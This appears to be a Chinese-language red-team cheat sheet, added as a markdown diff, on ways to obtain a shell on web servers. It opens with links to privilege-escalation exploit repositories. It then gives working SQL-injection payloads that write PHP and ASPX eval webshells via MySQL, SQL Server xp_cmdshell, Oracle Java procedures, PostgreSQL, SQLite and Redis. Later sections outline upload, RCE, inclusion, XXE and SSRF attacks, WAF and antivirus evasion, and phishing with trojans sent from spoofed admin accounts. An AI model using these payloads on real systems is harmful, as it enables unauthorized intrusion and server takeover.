@@ -1,0 +1,243 @@
+
+# 0x00 提权getshell脚本资源 
+**Windows 下的提权大合集**
+项目地址：https://github.com/lyshark/Windows-exploits
+
+**Windows平台提权漏洞集合**
+项目地址：https://github.com/SecWiki/windows-kernel-exploits
+
+**各大平台提权工具**
+项目地址：https://github.com/klsfct/getshell
+
+**Windwos辅助提权脚本**
+项目地址：https://github.com/ianxtianxt/win-exp-
+
+**SweetPotato修改版，用于webshell下执行命令**
+项目地址：https://github.com/uknowsec/SweetPotato
+
+**Webshell下提权执行命令**
+项目地址：https://github.com/uknowsec/getSystem
+
+**推荐阅读**  
+**Linux平台提权漏洞集合**
+https://github.com/s0wr0b1ndef/Linux-Kernel-Exploites
+
+
+
+无论是常规渗透测试还是攻防对抗，亦或黑灰产对抗、APT攻击，getshell 是一个从内到外的里程碑成果。我们接下来总结下常见拿shell的一些思路和方法。文中可能有一些不足之处，还望大佬不吝赐教。
+
+![](_v_images/20200519102512707_22811.png)
+
+# 0x01 注入getshell
+
+一般前提条件：有权限、知道路径
+
+mysql  
+**select** **0**x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e **into** outfile '/var/www/html/1.php'  
+  
+**Sql** server  
+存储过程xp_cmdshell  
+**;****exec** master**..**xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item\["pass"\],"unsafe");%^> > D:\\WWW\\2333.aspx' **;***--*  
+  
+Oracle  
+**1**、创建JAVA包  
+**select** dbms_xmlquery**.**newcontext**(**'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;'**)** **from** dual**;**  
+**2**、JAVA权限  
+**select** dbms_xmlquery**.**newcontext**(**'declare PRAGMA AUTONOMOUS\_TRANSACTION;begin execute immediate ''begin dbms\_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;'**)** **from** dual**;**  
+**3**、创建函数  
+**select** dbms_xmlquery**.**newcontext**(**'declare PRAGMA AUTONOMOUS\_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p\_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'**)** **from** dual**;**  
+URL执行  
+id**=****602**'||utl\_inadd.get\_host_name((select LinxRUNCMD('cmd **/****c** dir d**:****/**') from dual))--  
+  
+postgresql  
+COPY (select '**<?**php phpinfo**();****?>**') to '**/**tmp**/****1****.**php';  
+  
+sqlite3  
+;attach database 'D**:**\www\**008****.**php' as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x'**3**c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e'**);**  
+  
+redis  
+**%****0**D**%****0**Aconfig**%****20****set****%****20**dir**%****20****%****2**Fvar**%****2**Fwww**%****2**Fhtml2F**%****0**D**%****0**Aconfig**%****20****set****%****20**dbfilename**%****20**shell**%****2**Ephp**%****0**D**%****0**Aset**%****20**x**%****2022****%****3****C****%****3**Fphp**%****20**phpinfo**%****28****%****29****%****3**B**%%****203**F**%****3**E**%****22****%****0**D**%****0**Asave**%****0**D**%****0**A  
+
+PS：oracle成功率受限于与数据库版本以及注入点
+
+  当然注入不一定都能拿到webshell，比如站库分离。但不管是否站库分离，只要权限够能够执行系统命令，反弹cmdshell 也是不错的选择。比如sa权限结合xp_cmdshell 存储过程，直接执行powershell,反弹到cobalt strike …
+
+# 0x02 上传 getwebshell
+
+   上传漏洞对于getshell 还是高频的，无论是前台上传点，还是后台（通过口令进入、或者XSS到后台、逻辑漏洞越权）上传点，当然也有可能要结合一些Web Server的解析漏洞。但像IIS和apache解析漏洞因为太老，现在成功概率都小很多。  
+   类似直接的上传漏洞就可以getshell的漏洞，例如IIS PUT上传、Tomcat PUT 上传，因为落脚点最终都跟上传有关系，这个就不单独去枚举。  
+   还有一批像一些编辑器（FCK、editor、CKedtor…）存在上传漏洞可以getshell。这一系列，一般是基于信息收集确定是否存在漏洞，然后进一步利用。（发现漏洞比利用漏洞更艺术）
+
+这个期间可能涉及逻辑绕过、WAF对抗、杀软绕过、执行层，主要解决四点：
+
+1. 代码或逻辑问题，可以上传脚本文件
+    
+2. 躲过WAF对脚本文件及上传内容的校验
+    
+3. 解决落地杀
+    
+4. 执行过程，躲过流量监控或者系统层监控  
+    同样RCE 也需要关注以上后几点，因为前面的入口场景不同。
+    
+
+# 0x03 RCE getshell
+
+  RCE是统称，包括远程代码执行、远程命令执行。当然这两个概念还是有意思的，比如struts2漏洞有的叫命令执行有的叫代码执行。这都不重要。一般根据触发点来命名。  
+  Java系的OGNL 表达式注入、EL注入、反序列化  
+  PHP系列的eval 类、伪协议类 代码执行、system类命令执行  
+  当然反序列化漏洞基本上编程语言都有，除了漏洞利用getshell，用作免杀后门webshell也是一个不错的思路推荐。  
+  正由于代码执行的部分结果是执行了系统命令，在命令执行的加持下，可以直接拿到应用或系统的shell，也是正统策略。  
+  根据《2019年Web应用安全年度报告》，高频系列27个漏洞漏洞（这些漏洞都值得深入分析及利用），大部分为远程代码执行，同时RCE系列，Java 组件也占比最大。  
+
+![](_v_images/20200519102511593_5409.png)
+
+列表如下：
+
+*Harbor API SQL注入(CVE-2019-19026/CVE-2019-19029)*  
+*Thinkcmf任意内容包含远程代码执行*  
+*泛微E-cology OA数据库配置信息泄漏*  
+*Fastjson远程拒绝服务*  
+*GhostScript远程代码执行(CVE-2019-14811)*  
+*泛微E-cology OA系统远程代码执行*  
+*Apache Solr远程代码执行(CVE-2019-0193)*  
+*FasterXML jackson-databind远程代码执行(CVE-2019-14439)*  
+*FasterXML jackson-databind远程代码执行(CVE-2019-12384)*  
+*FasterXML jackson-databind远程代码执行(CVE-2019-14379)*  
+*Xstream远程代码执行(CVE-2019-10173)*  
+*致远OA A8前台getshell*  
+*Apache axis远程代码执行*  
+*CoreMail未授权访问接口参数注入*  
+*Weblogic远程代码执行(CVE-2019-2729)*  
+*Weblogic远程代码执行(CVE-2019-2725)*  
+*Confluence远程代码执行(CVE-2019-3398)*  
+*Confluence远程代码执行(CVE-2019-3396)*  
+*Ruby On Rails任意文件读取(CVE-2019-5418)*  
+*Jenkins远程代码执行(CVE-2019-1003030)*  
+*ColdFusion远程代码执行(CVE-2019-7091)*  
+*Spring Boot Actuator远程代码执行*  
+*Drupal8 REST Module远程代码执行(CVE-2019-6340)*  
+*Jenkins远程代码执行(CVE-2019-1003000)*  
+*Apache Solr远程代码执行(CVE-2019-17558)*  
+*Fastjson远程代码执行*  
+*Jenkins远程代码执行(CVE-2019-1003000)*
+
+以上漏洞利用总结，可私M
+
+# 0x04 包含getwebshell
+
+  文件包含，常见JSP、ASPx、PHP 都有包含，但主要还是PHP的包含好用。因为可以包含任意路径的任意后缀，能控制include类函数的输入结合系统特性文件或者上传的文件结合，可以拿到webshell。  
+  JSP包含，默认情况下动态包含WEB路径下的JSP文件（静态包含可以包含任意后缀的文本文件，但不支持变量动态赋值暂不说明），2月份的CVE-2020-1938 Tomcat 文件包含漏洞，这个漏洞看上去是包含了任意格式的文件，但其实是因为AJP协议。  
+更多文件包含冷知识，参考 [原贴](https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483729&idx=1&sn=81714a7029845694bf3b82b4dd37bcbf&scene=21#wechat_redirect "原贴")
+
+# 0x05 漏洞组合拳getshell
+
+ 绕过既有认证+后台漏洞
+
+1. 口令猜测是门艺术活，进入后台多种漏洞的利用，包括前面提到的漏洞常见高危系列，还有一些备份还原、导入导出、 模板编辑等功能。
+    
+2. 登录逻辑绕过、越权类，搞定后台。进行典型漏洞利用
+    
+3. 通过XSS钓到cookie，或者利用CSRF类漏洞“借刀杀人”搞到后台权限。进行典型漏洞利用。  
+    [网站后台Getshell的方法总结](https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247484457&idx=1&sn=c323c9aea5a7be9fe468c187984113d8&scene=21#wechat_redirect "网站后台Getshell的方法总结")
+    
+
+ XXE
+
+   XXE漏洞，最理想的状态就是直接可以代码执行（类似PHP expert）；大多数还是以文件读取信息收集为主，结合源码或者配置文件（例如/etc/shadow、tomcat-users.xml等）getshell；还可以通过XXE的SSRF进行隔山打牛式getshell。  
+   当然对于漏洞挖掘来讲，无论是xml格式还是json格式的POST数据包都值得多关注下。说不定就有惊喜呢。
+
+ SSRF + RCE
+
+   原理上SSRF可以结合所有RCE（反序列化、s2、mysql … ；github 搜索SSRFmap、ssrf_proxy）的漏洞进行组合利用，只是我们在平常实例角度用SSRF+redis未授权用的多一些。
+
+ 任意文件读取Getshell
+
+   正常的一般是通过读取web.xml 获取class文件，然后反编译，找到代码的一些漏洞。进而拿到系统的权限。当然还有文件读取加文件上传的曲折配合（[任意文件读取漏洞的曲折历程](https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247486140&idx=1&sn=65709218fe4b9e4fd42ad22fc1120aff&scene=21#wechat_redirect "任意文件读取漏洞的曲折历程")）
+
+# 0x06 系统层getcmdshell
+
+1. 暴力破解的艺术，毕竟锤子开锁和要是开锁在入侵角度结果是一样的。
+    
+2. 常规协议：SSH、RDP、SMB、VPC、Redis 等中间件类
+    
+3. 通过数据库执行语句获得了系统shell，对于获取权限，比sql注入更直接。
+    
+4. 设备层：VPN、防火墙，搞定这种边界设备，单车变摩托。
+    
+
+# 0x07 钓鱼 getcmdshell
+
+   发送钓鱼邮件，捆绑的马，访问即加载、点击即执行类的马。  
+   这一类攻击一般结合社工，例如借用IT管理员发送或某领导的账号去发送（所以这时候的邮箱的0day就灰常重要了，当然如果在邮箱内部找到类似VPN或者密码表类，也不需要这么麻烦，一把梭…），可信度就高很多。对于红队来讲，钓的鱼儿还是以IT部门系列为主，普通办公区的主机权限还需要做更多的工作。
+
+# 0x08 红队shell竞争分析
+
+1. 拼信息收集，漏洞点，别人找不到，我找的到（例如移动端、物联网等接口信息，当然这种shell，一般距离核心应用可能也远一些）；
+    
+2. 拼利用速度，自动化一条龙（基本属于日常漏洞和工程化的积累）；
+    
+3. 拼0day （VPN --- Mail --- OA --- java组件 --- CMS --- 关键设备 ）；
+    
+4. 拼细节漏洞，组合利用。（[这是一篇“不一样”的真实渗透测试案例分析文章](https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483670&idx=1&sn=1063bf299a8894f87521e8d73a687ff3&scene=21#wechat_redirect "这是一篇“不一样”的真实渗透测试案例分析文章") ）
+    
+
+   以上为本次所感所想，当然除了这种按照漏洞类型大类去分类，还有一些具体的漏洞也可以直接getshell，本次分析意义，就是在没有思路的时候，有个相对体系性思考框架。毕竟储备充足才会看上去像运气一样水到渠成，其实都是局部真相。
+   
+# 0x09[Getshell姿势文章大集合](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247485913&idx=1&sn=4662c240a519d409677ff060c290e2d3&chksm=ec1f5ce6db68d5f053a1a661726031bbf5d21680d2766e88e63051a1eeb3cf6fda195bb5ad33&scene=21#wechat_redirect)**
+ [**某SRC站点从源码泄露到getshell**](http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&mid=2247486104&idx=3&sn=3732221aef2da7c001256e6be51fe345&scene=21#wechat_redirect)
+
+ [**记一次渗透实战——漏洞组合拿shell**](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247483741&idx=1&sn=95c520e4254f091e7ef60b83f858867a&scene=21#wechat_redirect)
+
+ [**看我如何突破某主机卫士搞定asp站点**](http://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657033857&idx=1&sn=7aca39dab817ba961fff9b3dc814624f&scene=21#wechat_redirect)
+
+ [**对一次kangle蜘蛛池网站的简单渗透（已经getshell）**](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650441483&idx=2&sn=0657e6a47601acf55993dbf1a4b9e3fb&scene=21#wechat_redirect)
+
+ [**phpwind 9.0.2 任意执行SQL语句(可getshell)**](http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&mid=2247485919&idx=2&sn=a4f23abc2fca5ea5bb47f6e7da2fd174&scene=21#wechat_redirect)
+
+ [**如何从SQLi到RCE - ecshop 2.x / 3.x无限制getshell漏洞分析（上）**](http://mp.weixin.qq.com/s?__biz=MjM5MjU0NzM1Nw==&mid=2650737796&idx=1&sn=6baa301508bceab8c4fda6f39365f1db&scene=21#wechat_redirect)
+
+ [**一键从SSRF到getshell**](http://mp.weixin.qq.com/s?__biz=MzI4OTc1MjM5NQ==&mid=2247484035&idx=1&sn=97da6349702d84d7af05e04df37fc467&scene=21#wechat_redirect)
+
+ [**Catfish—缓存漏洞&配合CSRF到Getshell**](http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&mid=2247484120&idx=1&sn=aaeec3238102fdf88a22ffb1b9f30a47&scene=21#wechat_redirect)
+
+ [**POSCMS交易所系统多个高危漏洞详解，可前台GetShell！**](http://mp.weixin.qq.com/s?__biz=MzU1NzY3NzE4OQ==&mid=2247484521&idx=1&sn=d1e7acdc1269c390f610e061143b754e&scene=21#wechat_redirect)
+
+ [**SURFSRC | 通过SNMP配置文件注入getshell**](http://mp.weixin.qq.com/s?__biz=MzI0NjAyMjU4MA==&mid=2649583704&idx=2&sn=e87822428b9ce3a015c9637aa5f105fc&scene=21#wechat_redirect)
+
+ [**getshell之后难忘的经历**](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652848693&idx=1&sn=158abf38b7616126b6c54e4d2496c1ee&scene=21#wechat_redirect)
+
+ [**一剑封喉之Getshell**](http://mp.weixin.qq.com/s?__biz=MzA3OTMxNTcxNA==&mid=2650727981&idx=1&sn=52482cfefb43a80b301b06d495750af6&scene=21#wechat_redirect)
+
+ [**Getshell系列二：瞒天过海、暗渡陈仓，图与shell的结合才是最美**](http://mp.weixin.qq.com/s?__biz=MzA3OTMxNTcxNA==&mid=2650728282&idx=1&sn=3871f1b4bf94fadd41c8f246e7cf938e&scene=21#wechat_redirect)
+
+ [**接力打力之getshell**](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652849004&idx=1&sn=af1822ea6889ac045056401591df6bbc&scene=21#wechat_redirect)
+
+ [**某CMS最新版本测试全过程（前台Getshell）**](http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&mid=2247485801&idx=3&sn=7b153c222be396b166d2937518ad0315&scene=21#wechat_redirect)
+
+ [**尝试利用slmail的漏洞来getshell**](http://mp.weixin.qq.com/s?__biz=Mzg5MzA1MzQ1Ng==&mid=2247483720&idx=1&sn=53e3aa12445ef42d2f77e1ff65b98266&scene=21#wechat_redirect)
+
+ [**WTCMS一处文件上传getshell**](http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&mid=2247486124&idx=3&sn=9e5047fdf198bfe8617e72b54538bb22&scene=21#wechat_redirect)
+
+ [**phpmyadmin getshell姿势**](http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&mid=2247485022&idx=3&sn=bbba7210f51afe061f39688b783c3e5e&scene=21#wechat_redirect)
+
+ [**新鲜出炉某"虚拟币"通用程序GetShell，"真香"**](http://mp.weixin.qq.com/s?__biz=MzU0MjExNDkyMQ==&mid=2247485632&idx=1&sn=3aa926dddf9f1e130fc384b5a2061b4f&scene=21#wechat_redirect)
+
+ [**男默女泪！一次备份文件泄露引起的Getshell**](http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247483894&idx=1&sn=f753415a70489a89e2e7a403e8f2f5b3&scene=21#wechat_redirect)
+
+ [**CmsEasy前台无限制GetShell**](http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&mid=2247484150&idx=1&sn=f8d2f693aeea231cf38a756cf5f1a8d6&scene=21#wechat_redirect)
+
+ [**phpcms v9前台getshell**](http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&mid=2247484400&idx=1&sn=61a21555af74b3c23b83d925604f9e28&scene=21#wechat_redirect)
+
+ [**seacms-v7.2后台getshell漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzU3MzU0NDQwNA==&mid=2247483874&idx=1&sn=d3849986af169f6660d6529c43ac082e&scene=21#wechat_redirect)
+
+ [**简记siteserver远程模板下载Getshell漏洞**](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651073635&idx=3&sn=1680b52ad541b657bd35aefe6b9a1f8f&scene=21#wechat_redirect)
+
+ [**过某锁+安全狗双WAF Getshell南方站点编辑器**](http://mp.weixin.qq.com/s?__biz=MzIxNjQ0MTEwMg==&mid=2247487106&idx=2&sn=c410d01a3747bf2c4cb14c38ccf59160&scene=21#wechat_redirect)
+
+ [**从SQL注入到Getshell：记一次禅道系统的渗透**](http://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484179&idx=1&sn=c31dff51d58c628508e3bc2a52e9d407&scene=21#wechat_redirect)
+
+ [**【记录姿势】phpmyadmin通过日志getshell**](http://mp.weixin.qq.com/s?__biz=MzU0MjExNDkyMQ==&mid=2247485351&idx=1&sn=8b43f5e6751ba82be941850a448de20e&scene=21#wechat_redirect)
+
+[**记一次对非法站点测试的反思**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247485713&idx=1&sn=26058d9aea7ddb122122656a14fec128&chksm=ec1f5c2edb68d53813138334ad9a0b121160439153f9dca398c0084108b2f0b90688e9ac07d2&scene=21#wechat_redirect)
+
+ [**兄弟！请接住FineCMS的GetShell姿势**](http://mp.weixin.qq.com/s?__biz=MzIwNDI4MzAwOA==&mid=2650525014&idx=1&sn=ad6b7858254c40df6b12e495b80261b0&scene=21#wechat_redirect)
